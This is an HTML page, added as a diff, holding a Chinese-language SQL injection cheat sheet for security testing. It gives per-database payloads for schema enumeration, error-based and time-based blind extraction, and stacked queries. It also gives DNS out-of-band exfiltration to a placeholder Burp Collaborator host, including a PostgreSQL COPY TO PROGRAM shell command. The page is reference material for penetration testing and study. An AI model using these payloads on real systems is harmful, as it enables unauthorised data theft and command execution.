@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL知识分享</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+        }
+
+        header {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 2em 0;
+        }
+
+        h1 {
+            margin: 0;
+            font-size: 2.5em;
+        }
+
+        nav {
+            background-color: #34495e;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+        }
+
+        nav ul li {
+            padding: 1em;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        main {
+            max-width: 800px;
+            margin: 2em auto;
+            padding: 0 1em;
+        }
+
+        section {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2em;
+            padding: 2em;
+        }
+
+        h2 {
+            color: #2c3e50;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 0.5em;
+            margin-bottom: 1em;
+        }
+
+        pre {
+            background-color: #ecf0f1;
+            padding: 1em;
+            border-radius: 4px;
+            overflow-x: auto;
+        }
+
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        footer {
+            background-color: #2c3e50;
+            color: white;
+            text-align: center;
+            padding: 1em 0;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <h1>SQL知识分享</h1>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="index.html">返回学习页面</a></li>
+            <li><a href="#string-concatenation">字符串连接</a></li>
+            <li><a href="#string-extraction">字符串提取</a></li>
+            <li><a href="#query-comment">查询注释</a></li>
+            <li><a href="#database-version">数据库版本</a></li>
+            <li><a href="#database-content">数据库内容</a></li>
+            <li><a href="#conditional-error">条件错误</a></li>
+            <li><a href="#error-data-extraction">错误数据提取</a></li>
+            <li><a href="#batch-query">批量(或堆叠)查询</a></li>
+            <li><a href="#time-delay">时间延迟</a></li>
+            <li><a href="#conditional-time-delay">有条件时间延迟</a></li>
+            <li><a href="#dns-lookup">DNS查找</a></li>
+            <li><a href="#dns-data-leakage">DNS查找数据泄漏</a></li>
+        </ul>
+    </nav>
+    <main>
+        <p>以下为您介绍一些 SQL 相关的重要知识点，助力您更好地理解和运用 SQL 进行安全测试。</p>
+        <section id="string-concatenation">
+            <h2>字符串连接</h2>
+            <p>您可以将多个字符串连接在一起以创建单个字符串。</p>
+            <pre><code>
+甲骨文:  'foo'||'bar'
+微软:  'foo'+'bar'
+PostgreSQL:  'foo'||'bar'
+MySQL:  'foo' 'bar'[注意两个字符串之间有空格]           CONCAT('foo','bar')
+            </code></pre>
+        </section>
+        <section id="string-extraction">
+            <h2>字符串提取</h2>
+            <p>您可以从指定长度的指定偏移量中提取字符串的一部分。请注意偏移指数是 1 的。以下每个表达式将返回字符串 ba。</p>
+            <pre><code>
+甲骨文:  SUBSTR('foobar', 4, 2)
+微软:  SUBSTRING('foobar', 4, 2)
+PostgreSQL:  SUBSTRING('foobar', 4, 2)
+MySQL:  SUBSTRING('foobar', 4, 2)
+            </code></pre>
+        </section>
+        <section id="query-comment">
+            <h2>查询注释</h2>
+            <p>您可以使用注释来截断查询，并删除输入后原始查询的部分。</p>
+            <pre><code>
+甲骨文:  --comment
+微软:  --comment  /*comment*/
+PostgreSQL:  --comment      /*comment*/
+MySQL:  #comment    -- comment[注意--后有空格]      /*comment*/
+            </code></pre>
+        </section>
+        <section id="database-version">
+            <h2>数据库版本</h2>
+            <p>您可以查询数据库以确定其类型和版本。这些信息在制定更复杂的攻击时非常有用。</p>
+            <pre><code>
+甲骨文:  SELECT banner FROM v$version            SELECT version FROM v$instance
+微软:  SELECT @@version
+PostgreSQL:  SELECT version()
+MySQL:  SELECT @@version
+            </code></pre>
+        </section>
+        <section id="database-content">
+            <h2>数据库内容</h2>
+            <p>您可以列出数据库中存在的表以及这些表包含的列。</p>
+            <pre><code>
+甲骨文: SELECT * FROM all_tables
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'
+
+微软: SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'
+
+PostgreSQL: SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'
+
+MySQL: SELECT * FROM information_schema.tables
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'
+            </code></pre>
+        </section>
+        <section id="conditional-error">
+            <h2>条件错误</h2>
+            <p>您可以测试单个布尔条件，如果条件为真，则触发数据库错误。</p>
+            <pre><code>
+甲骨文:  SELECT CASE WHEN (YOUR-CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+微软:  SELECT CASE WHEN (YOUR-CONDITION) THEN 1/0 ELSE NULL END
+PostgreSQL:  1 = (SELECT CASE WHEN (YOUR-CONDITION) THEN 1/(SELECT 0) ELSE NULL END)
+MySQL:  SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tables),'a')
+            </code></pre>
+        </section>
+        <section id="error-data-extraction">
+            <h2>通过可见的错误消息提取数据</h2>
+            <p>您可能会发现错误消息，这些错误消息会泄露恶意查询返回的敏感数据。</p>
+            <pre><code>
+微软: SELECT 'foo' WHERE 1 = (SELECT 'secret')
+> Conversion failed when converting the varchar value 'secret' to data type int.
+PostgreSQL  SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
+> invalid input syntax for integer: "secret"
+MySQL:  SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
+> XPATH syntax error: '\secret'
+            </code></pre>
+        </section>
+        <section id="batch-query">
+            <h2>批量(或堆叠)查询</h2>
+            <p>您可以使用批处理查询连续执行多个查询。请注意，当执行后续查询时，结果不会返回到应用程序。因此，此技术主要用于盲盲漏洞，您可以使用第二个查询触发 DNS 查找，条件错误或时间延迟。</p>
+            <pre><code>
+甲骨文:  Does not support batched queries.
+微软:  QUERY-1; QUERY-2         QUERY-1 QUERY-2
+PostgreSQL:  QUERY-1; QUERY-2
+MySQL:  QUERY-1; QUERY-2
+
+使用 MySQL，批处理查询通常不能用于 SQL 注入。但是，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库进行通信，则偶尔可能发生这种情况。
+            </code></pre>
+        </section>
+        <section id="time-delay">
+            <h2>时间延迟</h2>
+            <p>处理查询时，可能会导致数据库出现时间延迟。以下将导致 10 秒的无条件时间延迟。</p>
+            <pre><code>
+甲骨文:  dbms_pipe.receive_message(('a'),10)
+微软:  WAITFOR DELAY '0:0:10'
+PostgreSQL:  SELECT pg_sleep(10)
+MySQL:  SELECT SLEEP(10)
+            </code></pre>
+        </section>
+        <section id="conditional-time-delay">
+            <h2>有条件时间延迟</h2>
+            <p>您可以测试单个布尔条件，如果条件为真，则可触发时间延迟。</p>
+            <pre><code>
+甲骨文:  SELECT CASE WHEN (YOUR-CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+微软: IF (YOUR-CONDITION) WAITFOR DELAY '0:0:10'
+PostgreSQL:  SELECT CASE WHEN (YOUR-CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END
+MySQL:  SELECT IF(YOUR-CONDITION,SLEEP(10),'a')
+            </code></pre>
+        </section>
+        <section id="dns-lookup">
+            <h2>DNS查找</h2>
+            <p>您可以使数据库对外部域执行 DNS 查找。为此，您需要使用 Burp Collaboration 生成一个独特的 Burp Collaborationor 子域，该域将在攻击中使用，然后对 Collaborator 服务器进行轮询以确认是否发生了 DNS 查找。</p>
+            <pre><code>
+甲骨文: (XXE) 漏洞触发 DNS 查找。该漏洞已修补，但存在许多未修补的Oracle安装:
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+以下技术适用于完全修补的 Oracle 安装，但需要提升特权:
+SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
+
+微软: exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+
+PostgreSQL: copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+
+MySQL: 
+以下技术仅在 Windows 上工作:
+LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
+SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+            </code></pre>
+        </section>
+        <section id="dns-data-leakage">
+            <h2>DNS查找数据泄漏</h2>
+            <p>您可以使数据库对包含注入查询结果的外部域执行 DNS 查找。为此，您需要使用 Burp Collaboration 生成一个独特的 Burp Collaborator 子域，该域将在攻击中使用，然后对 Collaborator 服务器进行轮询以检索任何 DNS 交互的详细信息，包括泄露的数据。</p>
+            <pre><code>
+甲骨文: SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
+
+微软: declare @p varchar(1024);set @p=(SELECT YOUR-QUERY);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+
+PostgreSQL: create OR replace function f() returns void as $$
+declare c text;
+declare p text;
+begin
+SELECT into p (SELECT YOUR-QUERY);
+c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
+execute c;
+END;
+$$ language plpgsql security definer;
+SELECT f();
+
+MySQL: 以下技术仅适用于 Windows:
+SELECT YOUR-QUERY INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
+            </code></pre>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2025 网络安全知识分享</p>
+    </footer>
+</body>
+
+</html>
